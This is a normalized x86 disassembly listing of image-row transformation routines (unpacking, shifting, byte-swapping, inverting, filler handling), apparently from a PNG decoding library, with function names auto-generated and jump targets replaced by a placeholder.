movzx cx [ edx + edi ]
movzx edx [ eax ]
mov ebp [ esi + 0x16c ]
movzx edx [ edx + ebp ]
imul dx cx
mov ebp 0xff
sub ebp ecx
movzx ecx [ esp + 0x1a ]
imul bp cx
add dx bp
mov ebp [ esp + 0x34 ]
mov ecx 0x80
add dx cx
movzx ecx dx
mov edx ecx
shr edx 0x8
add edx ecx
sar edx 0x8
movzx ecx dl
mov edx [ esi + 0x168 ]
movzx ecx [ ecx + edx ]
mov [ eax ] cl
jmp r-xdata
mov dx [ esp + 0x14 ]
mov cl [ esp + 0x16 ]
mov [ eax - 0x2 ] dx
mov [ eax ] cl
jmp r-xdata
inc edi
add eax 0x3
cmp edi ebp
jl r-xdata
sub_432ee0
mov eax [ esi + 0x70 ]
test eax 0x1000
je r-xdata
test [ esi + 0x70 ] 0x80
je r-xdata
mov dl [ ecx + 0x19 ]
cmp dl 0x3
jne r-xdata
test [ esi + 0x70 ] 0x2000
je r-xdata
and [ ecx + 0x19 ] 0xfb
xor eax eax
mov [ ecx + 0x16 ] ax
mov edx [ esi + 0x138 ]
mov [ ecx + 0x5a ] edx
mov eax [ esi + 0x13c ]
mov [ ecx + 0x5e ] eax
mov dx [ esi + 0x140 ]
mov [ ecx + 0x62 ] dx
cmp [ esi + 0x11a ] 0x0
je r-xdata
cmp [ esi + 0x11a ] 0x0
je r-xdata
test [ esi + 0x70 ] 0x400
je r-xdata
fld [ esi + 0x15c ]
fstp [ ecx + 0x28 ]
mov eax [ esi + 0x234 ]
mov [ ecx + 0xfc ] eax
cmp [ ecx + 0x18 ] 0x8
jae r-xdata
test eax 0x2000000
je r-xdata
xor eax eax
mov [ ecx + 0x19 ] 0x2
mov [ ecx + 0x18 ] 0x8
mov [ ecx + 0x16 ] ax
jmp r-xdata
test eax 0x2000000
je r-xdata
test [ esi + 0x70 ] 0x4000
je r-xdata
cmp [ ecx + 0x18 ] 0x10
jne r-xdata
xor edx edx
mov [ ecx + 0x16 ] dx
mov [ ecx + 0x18 ] 0x8
or dl 0x4
mov [ ecx + 0x19 ] dl
xor eax eax
mov [ ecx + 0x19 ] 0x6
mov [ ecx + 0x18 ] 0x8
mov [ ecx + 0x16 ] ax
jmp r-xdata
test [ esi + 0x70 ] 0x600000
je r-xdata
or [ ecx + 0x19 ] 0x2
mov [ ecx + 0x18 ] 0x8
test [ esi + 0x70 ] 0x40
je r-xdata
and [ ecx + 0x19 ] 0xfd
test [ esi + 0x70 ] 0x4
je r-xdata
mov al [ ecx + 0x19 ]
cmp al 0x2
je r-xdata
mov al [ ecx + 0x19 ]
mov dl 0x1
cmp al 0x3
je r-xdata
cmp [ ecx + 0x18 ] 0x8
jae r-xdata
cmp [ esi + 0x1ec ] 0x0
je r-xdata
cmp al 0x6
jne r-xdata
mov [ ecx + 0x1d ] dl
test al 0x2
je r-xdata
mov [ ecx + 0x18 ] 0x8
cmp [ ecx + 0x18 ] 0x8
jne r-xdata
mov al [ ecx + 0x19 ]
test al 0x4
je r-xdata
and al 0xfb
mov [ ecx + 0x19 ] al
mov [ ecx + 0x1d ] 0x3
jmp r-xdata
mov [ ecx + 0x19 ] 0x3
test [ esi + 0x70 ] 0x8000
je r-xdata
add [ ecx + 0x1d ] dl
test [ esi + 0x6c ] __dos_header
je r-xdata
test [ esi + 0x70 ] 0x100000
je r-xdata
cmp al 0x2
je r-xdata
mov al [ ecx + 0x18 ]
imul [ ecx + 0x1d ]
mov [ ecx + 0x1e ] al
cmp al 0x8
movzx eax al
jb r-xdata
mov al [ esi + 0x64 ]
cmp [ ecx + 0x18 ] al
jae r-xdata
add [ ecx + 0x1d ] dl
test [ esi + 0x70 ] 0x1000000
je r-xdata
test al al
jne r-xdata
imul eax [ ecx ]
add eax 0x7
shr eax 0x3
mov [ ecx + 0xc ] eax
retn
shr eax 0x3
imul eax [ ecx ]
mov [ ecx + 0xc ] eax
retn
mov al [ esi + 0x65 ]
cmp [ ecx + 0x1d ] al
jae r-xdata
mov [ ecx + 0x18 ] al
or al 0x4
mov [ ecx + 0x19 ] al
mov [ ecx + 0x1d ] al
sub_433090
sub esp 0x38
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x34 ] eax
push ebp
mov ebp [ esp + 0x40 ]
cmp [ ebp + 0xec ] 0x0
jne r-xdata
test [ ebp + 0x6c ] 0x40
jne r-xdata
movzx eax [ ebp + 0x124 ]
mov ecx [ ebp + 0xe4 ]
push eax
push ecx
push r--data
lea edx [ esp + 0x10 ]
push 0x32
push edx
call sub_4564b2
push ebp
lea ecx [ esp + 0x1c ]
call sub_43b740
add esp 0x18
mov eax [ ebp + 0x70 ]
test eax 0x1000
je r-xdata
push ebp
mov ecx r--data
call sub_43b740
add esp 0x4
mov eax [ ebp + 0x6c ]
and eax __dos_header
je r-xdata
cmp [ ebp + 0x108 ] 0x3
jne r-xdata
test [ ebp + 0x70 ] 0x600000
push esi
je r-xdata
or eax 0x80
push eax
mov eax [ ebp + 0xec ]
lea edx [ ebp + 0x100 ]
inc eax
push edx
call sub_431e60
add esp 0x8
cmp [ ebp + 0x11a ] 0x0
je r-xdata
movzx eax [ ebp + 0x11a ]
mov ecx [ ebp + 0x188 ]
mov edx [ ebp + 0x114 ]
push eax
mov eax [ ebp + 0xec ]
push ecx
push edx
inc eax
push eax
lea ecx [ ebp + 0x100 ]
push ecx
call sub_435a70
add esp 0x14
jmp r-xdata
test [ ebp + 0x70 ] 0x4000
push edi
je r-xdata
mov eax [ ebp + 0xec ]
inc eax
push eax
lea ecx [ ebp + 0x100 ]
push ecx
mov eax ebp
call sub_433e40
add esp 0x8
test eax eax
je r-xdata
push 0x0
lea ecx [ ebp + 0x100 ]
push ecx
test eax 0x2000000
je r-xdata
test [ ebp + 0x70 ] 0x80
je r-xdata
test [ ebp + 0x68 ] 0x800
jne r-xdata
mov edx [ ebp + 0x70 ]
and edx 0x600000
mov [ ebp + 0x228 ] 0x1
cmp edx __dos_header
jne r-xdata
lea edx [ ebp + 0x18c ]
push edx
lea eax [ ebp + 0x100 ]
push eax
jmp r-xdata
mov eax [ ebp + 0x70 ]
test eax 0x2000
je r-xdata
cmp [ ebp + 0x11a ] 0x0
jne r-xdata
mov eax [ ebp + 0xec ]
inc eax
lea edi [ ebp + 0x100 ]
call sub_433ce0
mov eax [ ebp + 0x70 ]
and eax 0x600000
cmp eax 0x200000
jne r-xdata
mov ecx r--data
mov esi ebp
call sub_43b800
mov edx [ ebp + 0xec ]
inc edx
call sub_435c90
add esp 0x8
test [ ebp + 0x70 ] 0x400
je r-xdata
test al al
jns r-xdata
mov ecx [ ebp + 0x158 ]
mov edx [ ebp + 0x178 ]
mov eax [ ebp + 0x174 ]
push ecx
mov ecx [ ebp + 0x170 ]
push edx
mov edx [ ebp + 0x16c ]
push eax
mov eax [ ebp + 0x168 ]
push ecx
mov ecx [ ebp + 0x164 ]
push edx
push eax
push ecx
lea edx [ ebp + 0x142 ]
push edx
mov edx [ ebp + 0xec ]
lea eax [ ebp + 0x138 ]
push eax
lea ecx [ ebp + 0x18c ]
push ecx
lea eax [ ebp + 0x100 ]
inc edx
push eax
call sub_434580
add esp 0x2c
test [ ebp + 0x126 ] 0x4
je r-xdata
push ebp
mov ecx r--data
call sub_43b740
add esp 0x4
test [ ebp + 0x70 ] 0x40
je r-xdata
mov eax [ ebp + 0xec ]
inc eax
lea esi [ ebp + 0x100 ]
call sub_433820
cmp [ ebp + 0x126 ] 0x3
je r-xdata
cmp [ ebp + 0x11a ] 0x0
jne r-xdata
test [ ebp + 0x70 ] 0x20
je r-xdata
mov eax [ ebp + 0x1ec ]
mov ecx [ ebp + 0xec ]
push eax
mov eax [ ebp + 0x1f0 ]
lea edx [ ebp + 0x100 ]
inc ecx
push edx
call sub_4360a0
add esp 0x8
cmp [ ebp + 0x104 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x158 ]
mov edx [ ebp + 0x170 ]
mov eax [ ebp + 0x164 ]
push ecx
mov ecx [ ebp + 0xec ]
push edx
push eax
inc ecx
push ecx
lea edx [ ebp + 0x100 ]
push edx
call sub_435660
add esp 0x14
test [ ebp + 0x126 ] 0x4
jne r-xdata
test [ ebp + 0x70 ] 0x8
je r-xdata
mov eax [ ebp + 0xec ]
inc eax
lea ecx [ ebp + 0x100 ]
call sub_431d90
push ebp
mov ecx r--data
call sub_43b740
add esp 0x4
test [ ebp + 0x70 ] 0x4
je r-xdata
mov eax [ ebp + 0xec ]
inc eax
lea edx [ ebp + 0x181 ]
push eax
lea ecx [ ebp + 0x100 ]
call sub_433650
add esp 0x4
test [ ebp + 0x70 ] 0x1
je r-xdata
mov eax [ ebp + 0xec ]
lea ecx [ ebp + 0x100 ]
inc eax
push ecx
call sub_433520
add esp 0x4
test [ ebp + 0x70 ] 0x10000
je r-xdata
mov eax [ ebp + 0xec ]
inc eax
lea edx [ ebp + 0x100 ]
call sub_4320b0
test [ ebp + 0x70 ] 0x4000
je r-xdata
mov eax [ ebp + 0xec ]
inc eax
lea ecx [ ebp + 0x100 ]
call sub_431e10
test [ ebp + 0x70 ] 0x8000
pop edi
je r-xdata
test [ ebp + 0x68 ] 0x800
je r-xdata
test [ ebp + 0x70 ] 0x80000
je r-xdata
mov edx [ ebp + 0x6c ]
mov eax [ ebp + 0xec ]
push edx
movzx edx [ ebp + 0x12e ]
lea ecx [ ebp + 0x100 ]
inc eax
push ecx
call sub_433a50
add esp 0x8
mov eax [ ebp + 0xec ]
inc eax
lea edi [ ebp + 0x100 ]
call sub_433ce0
test [ ebp + 0x70 ] 0x20000
je r-xdata
mov ecx [ ebp + 0xec ]
inc ecx
lea eax [ ebp + 0x100 ]
call sub_433990
mov al 0x10
test [ ebp + 0x70 ] al
je r-xdata
mov ecx [ ebp + 0xec ]
inc ecx
lea eax [ ebp + 0x100 ]
call sub_433860
test [ ebp + 0x70 ] 0x100000
pop esi
je r-xdata
cmp [ ebp + 0x109 ] al
jne r-xdata
mov ecx [ esp + 0x38 ]
pop ebp
xor ecx esp
call sub_43f96b
add esp 0x38
retn
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
movzx ecx [ ebp + 0x10a ]
imul ecx [ ebp + 0x100 ]
mov eax [ ebp + 0xec ]
inc eax
test ecx ecx
jbe r-xdata
mov al [ ebp + 0x64 ]
test al al
je r-xdata
mov edx [ ebp + 0xec ]
inc edx
push edx
lea ecx [ ebp + 0x100 ]
push ecx
push ebp
call eax
add esp 0xc
mov esi ecx
lea esp [ esp ]
mov al [ ebp + 0x65 ]
test al al
je r-xdata
mov [ ebp + 0x109 ] al
mov dl [ eax ]
mov cl [ eax + 0x1 ]
mov [ eax ] cl
mov [ eax + 0x1 ] dl
add eax 0x2
sub esi 0x1
jne r-xdata
mov al [ ebp + 0x10a ]
imul [ ebp + 0x109 ]
mov [ ebp + 0x10b ] al
cmp al 0x8
movzx eax al
jb r-xdata
mov [ ebp + 0x10a ] al
imul eax [ ebp + 0x100 ]
add eax 0x7
shr eax 0x3
shr eax 0x3
imul eax [ ebp + 0x100 ]
jmp r-xdata
mov [ ebp + 0x104 ] eax
sub_433520
mov edx [ esp + 0x4 ]
mov cl [ edx + 0x9 ]
cmp cl 0x8
jae r-xdata
retn
push ebx
push ebp
movzx ecx cl
sub ecx 0x1
push esi
push edi
mov edi [ edx ]
je r-xdata
lea ecx [ edi - 0x1 ]
mov esi ecx
shr esi 0x3
add esi eax
lea ebp [ edi + eax - 0x1 ]
and ecx 0x7
mov eax 0x7
sub eax ecx
test edi edi
jbe r-xdata
sub ecx 0x1
je r-xdata
mov al [ edx + 0xa ]
mov cl al
add cl cl
add cl cl
movzx eax al
add cl cl
imul eax edi
pop edi
pop esi
pop ebp
mov [ edx + 0x9 ] 0x8
mov [ edx + 0xb ] cl
mov [ edx + 0x4 ] eax
pop ebx
mov edx edi
nop
lea ecx [ edi - 0x1 ]
mov esi ecx
shr esi 0x2
add esi eax
lea ebp [ edi + eax - 0x1 ]
and ecx 0x3
mov eax 0x3
sub eax ecx
add eax eax
test edi edi
jbe r-xdata
sub ecx 0x2
jne r-xdata
inc eax
xor eax eax
dec esi
jmp r-xdata
mov edx edi
nop
lea ecx [ edi - 0x1 ]
mov esi ecx
shr esi 0x1
add esi eax
lea ebp [ edi + eax - 0x1 ]
and ecx 0x1
mov eax 0x1
sub eax ecx
add eax eax
add eax eax
test edi edi
jbe r-xdata
mov bl [ esi ]
mov cl al
shr bl cl
and bl 0x1
mov [ ebp ] bl
cmp eax 0x7
jne r-xdata
mov edx [ esp + 0x14 ]
dec ebp
sub edx 0x1
jne r-xdata
add eax 0x2
xor eax eax
dec esi
jmp r-xdata
mov [ esp + 0x14 ] edi
mov bl [ esi ]
mov cl al
shr bl cl
and bl 0x3
mov [ ebp ] bl
cmp eax 0x6
jne r-xdata
jmp r-xdata
dec ebp
sub edx 0x1
jne r-xdata
mov eax 0x4
xor eax eax
dec esi
jmp r-xdata
mov bl [ esi ]
mov cl al
shr bl cl
and bl 0xf
mov [ ebp ] bl
cmp eax 0x4
jne r-xdata
jmp r-xdata
dec ebp
sub [ esp + 0x14 ] 0x1
jne r-xdata
sub_433650
sub esp 0x14
push ebx
mov bl [ ecx + 0x8 ]
push esi
mov esi [ esp + 0x20 ]
cmp bl 0x3
je r-xdata
pop esi
pop ebx
add esp 0x14
retn
push ebp
mov ebp [ ecx ]
push edi
mov [ esp + 0x10 ] 0x0
test bl 0x2
je r-xdata
movzx eax [ edx + 0x3 ]
movzx edi [ ecx + 0x9 ]
sub edi eax
mov [ esp + 0x14 ] edi
mov edi 0x1
movzx eax [ ecx + 0x9 ]
movzx esi [ edx ]
mov edi eax
sub edi esi
movzx esi [ edx + 0x1 ]
mov [ esp + 0x14 ] edi
mov edi eax
sub edi esi
movzx esi [ edx + 0x2 ]
sub eax esi
mov esi [ esp + 0x28 ]
mov [ esp + 0x18 ] edi
mov [ esp + 0x1c ] eax
mov edi 0x3
jmp r-xdata
xor edx edx
xor eax eax
cmp edi edx
jle r-xdata
movzx edx [ edx + 0x4 ]
movzx eax [ ecx + 0x9 ]
sub eax edx
mov [ esp + edi * 4 + 0x14 ] eax
inc edi
test bl 0x4
je r-xdata
pop edi
pop ebp
lea esp [ esp ]
mov [ esp + 0x10 ] 0x1
mov [ esp + eax * 4 + 0x14 ] edx
jmp r-xdata
cmp [ esp + eax * 4 + 0x14 ] edx
jg r-xdata
cmp [ esp + 0x10 ] dx
je r-xdata
inc eax
cmp eax edi
jl r-xdata
movzx eax [ ecx + 0x9 ]
add eax 0xfffffffe
cmp eax 0xe
ja r-xdata
movzx eax [ eax + lookup_table_43380c ]
jmp [ eax * 4 + jump_table_4337f8 ]
mov ecx [ ecx + 0x4 ]
mov eax esi
cmp ecx edx
jbe r-xdata
mov edi [ ecx + 0x4 ]
mov edx [ esp + 0x14 ]
mov ecx edx
mov eax 0xf0
sar eax cl
mov ebx 0xf
sar ebx cl
and al 0xf0
or al bl
test edi edi
jbe r-xdata
imul ebp edi
xor ebx ebx
test ebp ebp
jbe r-xdata
imul ebp edi
xor ebx ebx
test ebp ebp
jbe r-xdata
nop
lea ebx [ ebx ]
mov eax ebx
xor edx edx
div edi
inc ebx
inc esi
mov cl [ esp + edx * 4 + 0x14 ]
shr [ esi - 0x1 ] cl
cmp ebx ebp
jb r-xdata
xor edx edx
mov eax ebx
div edi
movzx ax [ esi ]
mov ecx 0x100
imul ax cx
movzx ecx [ esi + 0x1 ]
add ax cx
inc esi
inc ebx
inc esi
movzx ecx [ esp + edx * 4 + 0x14 ]
shr ax cl
movzx eax ax
mov edx eax
shr edx 0x8
mov [ esi - 0x2 ] dl
mov [ esi - 0x1 ] al
cmp ebx ebp
jb r-xdata
mov dl [ eax ]
shr dl 0x1
and dl 0x55
mov [ eax ] dl
inc eax
sub ecx 0x1
jne r-xdata
pop edi
pop ebp
pop esi
pop ebx
add esp 0x14
retn
mov bl [ esi ]
mov cl dl
shr bl cl
inc esi
and bl al
sub edi 0x1
mov [ esi - 0x1 ] bl
jne r-xdata
pop edi
pop ebp
pop esi
pop ebx
add esp 0x14
retn
pop edi
pop ebp
pop esi
pop ebx
add esp 0x14
retn
sub_433820
cmp [ esi + 0x9 ] 0x10
jne r-xdata
retn
movzx edx [ esi + 0xa ]
imul edx [ esi ]
mov ecx eax
test edx edx
jbe r-xdata
mov al [ esi + 0xa ]
mov cl al
add cl cl
add cl cl
movzx edx al
add cl cl
imul edx [ esi ]
mov [ esi + 0x9 ] 0x8
mov [ esi + 0xb ] cl
mov [ esi + 0x4 ] edx
push edi
mov edi edx
mov dl [ eax ]
mov [ ecx ] dl
add eax 0x2
inc ecx
sub edi 0x1
jne r-xdata
pop edi
sub_433860
push ecx
mov edx [ eax ]
push ebx
push esi
mov esi ecx
mov cl [ eax + 0x8 ]
cmp cl 0x6
jne r-xdata
cmp cl 0x4
jne r-xdata
cmp [ eax + 0x9 ] 0x8
mov eax [ eax + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ecx
retn
cmp [ eax + 0x9 ] 0x8
mov eax [ eax + 0x4 ]
jne r-xdata
add eax esi
mov ecx eax
test edx edx
jbe r-xdata
add eax esi
mov ecx eax
test edx edx
jbe r-xdata
add eax esi
mov ecx eax
test edx edx
jbe r-xdata
add eax esi
mov ecx eax
test edx edx
jbe r-xdata
mov esi edx
mov esi edx
lea ebx [ ebx ]
mov esi edx
mov esi edx
mov dl [ eax - 0x1 ]
dec eax
movzx ebx [ eax - 0x1 ]
dec eax
dec eax
mov [ esp + 0x9 ] bl
movzx ebx [ eax ]
mov [ ecx - 0x1 ] bl
movzx ebx [ eax - 0x1 ]
dec ecx
mov [ ecx - 0x1 ] bl
dec eax
movzx ebx [ eax - 0x1 ]
dec ecx
mov [ ecx - 0x1 ] bl
dec eax
movzx ebx [ eax - 0x1 ]
dec ecx
dec eax
mov [ ecx - 0x1 ] bl
movzx ebx [ eax - 0x1 ]
dec ecx
dec eax
dec ecx
mov [ ecx ] bl
movzx ebx [ eax - 0x1 ]
dec eax
dec ecx
mov [ ecx ] bl
dec ecx
mov [ ecx ] dl
movzx edx [ esp + 0x9 ]
dec ecx
sub esi 0x1
mov [ ecx ] dl
jne r-xdata
pop esi
pop ebx
pop ecx
retn
mov dl [ eax - 0x1 ]
dec eax
movzx ebx [ eax - 0x1 ]
dec eax
mov [ ecx - 0x1 ] bl
movzx ebx [ eax - 0x1 ]
dec ecx
dec eax
dec ecx
mov [ ecx ] bl
movzx ebx [ eax - 0x1 ]
dec eax
dec ecx
mov [ ecx ] bl
dec ecx
sub esi 0x1
mov [ ecx ] dl
jne r-xdata
pop esi
pop ebx
pop ecx
retn
mov dl [ eax - 0x1 ]
dec eax
movzx ebx [ eax - 0x1 ]
dec eax
dec eax
mov [ esp + 0x9 ] bl
movzx ebx [ eax ]
dec ecx
mov [ ecx ] bl
movzx ebx [ eax - 0x1 ]
dec eax
dec ecx
mov [ ecx ] bl
dec ecx
mov [ ecx ] dl
movzx edx [ esp + 0x9 ]
dec ecx
sub esi 0x1
mov [ ecx ] dl
jne r-xdata
mov dl [ eax - 0x1 ]
dec eax
mov bl [ eax - 0x1 ]
dec eax
dec ecx
mov [ ecx ] bl
dec ecx
sub esi 0x1
mov [ ecx ] dl
jne r-xdata
pop esi
pop ebx
pop ecx
retn
sub_433990
mov edx [ eax ]
push esi
mov esi ecx
mov cl [ eax + 0x8 ]
cmp cl 0x6
jne r-xdata
cmp cl 0x4
jne r-xdata
cmp [ eax + 0x9 ] 0x8
mov eax [ eax + 0x4 ]
jne r-xdata
pop esi
retn
cmp [ eax + 0x9 ] 0x8
mov eax [ eax + 0x4 ]
jne r-xdata
add eax esi
test edx edx
jbe r-xdata
add eax esi
test edx edx
jbe r-xdata
add eax esi
test edx edx
jbe r-xdata
add eax esi
mov ecx eax
test edx edx
jbe r-xdata
mov esi edx
jmp r-xdata
dec eax
or cl 0xff
sub cl [ eax ]
sub eax 0x3
sub edx 0x1
mov [ eax + 0x3 ] cl
jne r-xdata
mov esi edx
mov esi edx
dec eax
or dl 0xff
sub dl [ eax ]
mov ecx eax
mov [ ecx ] dl
dec eax
or dl 0xff
sub dl [ eax ]
sub eax 0x6
sub esi 0x1
mov [ ecx - 0x1 ] dl
jne r-xdata
pop esi
retn
dec eax
or dl 0xff
sub dl [ eax ]
mov ecx eax
mov [ ecx ] dl
dec eax
or dl 0xff
sub dl [ eax ]
sub eax 0x2
sub esi 0x1
mov [ ecx - 0x1 ] dl
jne r-xdata
dec eax
or dl 0xff
sub dl [ eax ]
dec ecx
mov [ ecx ] dl
mov dl [ eax - 0x1 ]
dec eax
dec ecx
sub esi 0x1
mov [ ecx ] dl
jne r-xdata
pop esi
retn
pop esi
retn
sub_433a50
mov cl [ esp + 0x8 ]
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ ebp ]
push edi
mov edi eax
mov al [ ebp + 0x8 ]
mov ebx edx
shr ebx 0x8
mov [ esp + 0x14 ] bl
test al al
jne r-xdata
cmp al 0x2
jne r-xdata
mov al [ ebp + 0x9 ]
cmp al 0x8
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov al [ ebp + 0x9 ]
cmp al 0x8
jne r-xdata
cmp al 0x10
jne r-xdata
add edi esi
lea eax [ edi + esi ]
test cl cl
jns r-xdata
cmp al 0x10
jne r-xdata
lea edi [ edi + esi * 2 ]
add edi esi
lea eax [ edi + esi ]
test cl cl
jns r-xdata
lea edi [ edi + esi * 2 ]
lea eax [ edi + esi * 2 ]
test cl cl
jns r-xdata
test esi esi
jbe r-xdata
cmp esi 0x1
jbe r-xdata
lea eax [ esi + esi * 2 ]
test cl cl
lea ecx [ edi + eax * 2 ]
lea eax [ ecx + esi * 2 ]
jns r-xdata
test esi esi
jbe r-xdata
cmp esi 0x1
jbe r-xdata
test esi esi
jbe r-xdata
cmp esi 0x1
jbe r-xdata
pop edi
lea ecx [ esi + esi ]
pop esi
mov [ ebp + 0xa ] 0x2
mov [ ebp + 0xb ] 0x10
mov [ ebp + 0x4 ] ecx
pop ebp
pop ebx
retn
mov ecx esi
jmp r-xdata
mov [ eax - 0x1 ] dl
pop edi
lea eax [ esi + esi ]
pop esi
mov [ ebp + 0xa ] 0x2
mov [ ebp + 0xb ] 0x10
mov [ ebp + 0x4 ] eax
pop ebp
pop ebx
retn
lea ecx [ esi - 0x1 ]
lea ecx [ ecx ]
test esi esi
jbe r-xdata
cmp esi 0x1
jbe r-xdata
pop edi
lea ecx [ esi * 4 ]
pop esi
mov [ ebp + 0xb ] 0x20
mov [ ebp + 0xa ] 0x4
mov [ ebp + 0x4 ] ecx
pop ebp
pop ebx
retn
mov ecx esi
mov [ eax - 0x1 ] dl
pop edi
lea eax [ esi * 4 ]
pop esi
mov [ ebp + 0xa ] 0x4
mov [ ebp + 0xb ] 0x20
mov [ ebp + 0x4 ] eax
pop ebp
pop ebx
retn
lea ecx [ esi - 0x1 ]
jmp r-xdata
pop edi
lea edx [ esi * 4 ]
pop esi
mov [ ebp + 0xa ] 0x2
mov [ ebp + 0xb ] 0x20
mov [ ebp + 0x4 ] edx
pop ebp
pop ebx
retn
mov [ esp + 0x14 ] esi
mov edi edi
dec eax
mov [ eax ] bl
mov [ eax - 0x1 ] dl
jmp r-xdata
lea ecx [ esi - 0x1 ]
mov [ esp + 0x14 ] ecx
mov bl [ edi - 0x1 ]
dec edi
dec eax
mov [ eax ] bl
dec eax
sub ecx 0x1
mov [ eax ] dl
jne r-xdata
dec eax
mov [ eax ] dl
mov bl [ edi - 0x1 ]
dec edi
dec eax
sub ecx 0x1
mov [ eax ] bl
jne r-xdata
lea ecx [ esi * 8 ]
mov [ ebp + 0xb ] 0x40
mov [ ebp + 0xa ] 0x4
mov [ ebp + 0x4 ] ecx
mov edi esi
lea esp [ esp ]
dec eax
mov [ eax ] bl
mov [ eax - 0x1 ] dl
jmp r-xdata
lea edi [ esi - 0x1 ]
movzx ebx [ edi - 0x1 ]
dec edi
mov [ eax - 0x1 ] bl
movzx ebx [ edi - 0x1 ]
dec eax
dec edi
dec eax
mov [ eax ] bl
movzx ebx [ edi - 0x1 ]
dec edi
dec eax
mov [ eax ] bl
dec eax
sub ecx 0x1
mov [ eax ] dl
jne r-xdata
mov [ eax - 0x1 ] dl
movzx ebx [ edi - 0x1 ]
dec eax
dec edi
dec eax
mov [ eax ] bl
movzx ebx [ edi - 0x1 ]
dec edi
dec eax
mov [ eax ] bl
movzx ebx [ edi - 0x1 ]
dec edi
dec eax
sub ecx 0x1
mov [ eax ] bl
jne r-xdata
movzx ecx [ edi - 0x1 ]
dec edi
dec eax
mov [ eax ] cl
movzx ecx [ edi - 0x1 ]
dec edi
dec eax
mov [ eax ] cl
dec eax
mov [ eax ] bl
dec eax
sub [ esp + 0x14 ] 0x1
mov [ eax ] dl
jne r-xdata
mov [ eax - 0x1 ] bl
dec eax
dec eax
mov [ eax ] dl
movzx ecx [ edi - 0x1 ]
dec edi
dec eax
mov [ eax ] cl
movzx ecx [ edi - 0x1 ]
dec edi
dec eax
sub [ esp + 0x14 ] 0x1
mov [ eax ] cl
jne r-xdata
movzx ebx [ ecx - 0x1 ]
mov [ eax - 0x1 ] bl
dec ecx
movzx ebx [ ecx - 0x1 ]
dec eax
mov [ eax - 0x1 ] bl
dec ecx
movzx ebx [ ecx - 0x1 ]
dec eax
mov [ eax - 0x1 ] bl
dec ecx
movzx ebx [ ecx - 0x1 ]
dec eax
mov [ eax - 0x1 ] bl
dec ecx
movzx ebx [ ecx - 0x1 ]
dec eax
dec ecx
mov [ eax - 0x1 ] bl
movzx ebx [ ecx - 0x1 ]
dec eax
dec ecx
dec eax
mov [ eax ] bl
movzx ebx [ esp + 0x14 ]
dec eax
mov [ eax ] bl
dec eax
sub edi 0x1
mov [ eax ] dl
jne r-xdata
mov [ eax - 0x1 ] bl
dec eax
mov [ eax - 0x1 ] dl
movzx ebx [ ecx - 0x1 ]
dec eax
mov [ eax - 0x1 ] bl
dec ecx
movzx ebx [ ecx - 0x1 ]
dec eax
mov [ eax - 0x1 ] bl
dec ecx
movzx ebx [ ecx - 0x1 ]
dec eax
dec ecx
mov [ eax - 0x1 ] bl
movzx ebx [ ecx - 0x1 ]
dec eax
dec ecx
mov [ eax - 0x1 ] bl
movzx ebx [ ecx - 0x1 ]
dec eax
dec ecx
dec eax
mov [ eax ] bl
movzx ebx [ ecx - 0x1 ]
dec ecx
dec eax
sub edi 0x1
mov [ eax ] bl
mov bl [ esp + 0x14 ]
jne r-xdata
sub_433ce0
mov cl [ edi + 0x9 ]
push esi
mov esi [ edi ]
cmp cl 0x8
jb r-xdata
pop esi
retn
mov dl [ edi + 0x8 ]
test dl 0x2
jne r-xdata
push ebp
test dl dl
jne r-xdata
cmp dl 0x4
jne r-xdata
cmp cl 0x8
jne r-xdata
add [ edi + 0xa ] 0x2
mov al [ edi + 0x9 ]
mov cl [ edi + 0xa ]
or [ edi + 0x8 ] 0x2
imul cl
mov [ edi + 0xb ] al
cmp al 0x8
pop ebp
movzx eax al
jb r-xdata
cmp cl 0x8
jne r-xdata
lea ecx [ eax + esi * 2 - 0x1 ]
lea eax [ ecx + esi * 4 ]
test esi esi
jbe r-xdata
lea ecx [ esi + eax - 0x1 ]
lea eax [ ecx + esi * 2 ]
test esi esi
jbe r-xdata
imul eax esi
add eax 0x7
shr eax 0x3
mov [ edi + 0x4 ] eax
shr eax 0x3
imul eax esi
mov [ edi + 0x4 ] eax
pop esi
retn
lea ecx [ eax + esi * 4 - 0x1 ]
lea eax [ ecx + esi * 4 ]
test esi esi
jbe r-xdata
lea ecx [ eax + esi * 2 - 0x1 ]
lea eax [ ecx + esi * 2 ]
test esi esi
jbe r-xdata
mov ebp esi
mov ebp esi
mov ebp esi
mov ebp esi
movzx edx [ ecx ]
mov [ eax ] dl
movzx edx [ ecx - 0x1 ]
mov [ eax - 0x1 ] dl
movzx edx [ ecx ]
dec eax
mov [ eax - 0x1 ] dl
movzx edx [ ecx - 0x1 ]
dec eax
dec eax
mov [ eax ] dl
movzx edx [ ecx ]
dec eax
mov [ eax ] dl
movzx edx [ ecx - 0x1 ]
dec ecx
dec eax
mov [ eax ] dl
dec eax
dec ecx
sub ebp 0x1
jne r-xdata
jmp r-xdata
movzx edx [ ecx ]
mov [ eax ] dl
movzx edx [ ecx ]
dec eax
mov [ eax ] dl
movzx edx [ ecx ]
dec eax
mov [ eax ] dl
dec eax
dec ecx
sub ebp 0x1
jne r-xdata
jmp r-xdata
movzx edx [ ecx ]
mov [ eax ] dl
movzx edx [ ecx - 0x1 ]
mov [ eax - 0x1 ] dl
dec eax
dec ecx
movzx edx [ ecx - 0x1 ]
mov [ eax - 0x1 ] dl
movzx edx [ ecx - 0x2 ]
dec ecx
dec eax
mov [ eax - 0x1 ] dl
movzx edx [ ecx ]
dec eax
mov [ eax - 0x1 ] dl
movzx edx [ ecx - 0x1 ]
dec eax
dec eax
mov [ eax ] dl
movzx edx [ ecx ]
dec eax
mov [ eax ] dl
movzx edx [ ecx - 0x1 ]
dec ecx
dec eax
mov [ eax ] dl
dec eax
dec ecx
sub ebp 0x1
jne r-xdata
movzx edx [ ecx ]
mov [ eax ] dl
movzx edx [ ecx - 0x1 ]
dec ecx
dec eax
mov [ eax ] dl
movzx edx [ ecx ]
dec eax
mov [ eax ] dl
movzx edx [ ecx ]
dec eax
mov [ eax ] dl
dec eax
dec ecx
sub ebp 0x1
jne r-xdata
jmp r-xdata
sub_433e40
sub esp 0x2c
mov ecx [ esp + 0x30 ]
mov dl [ ecx + 0x8 ]
push ebp
mov ebp [ ecx ]
push esi
xor esi esi
mov [ esp + 0x10 ] ebp
mov [ esp + 0xc ] esi
test dl 0x2
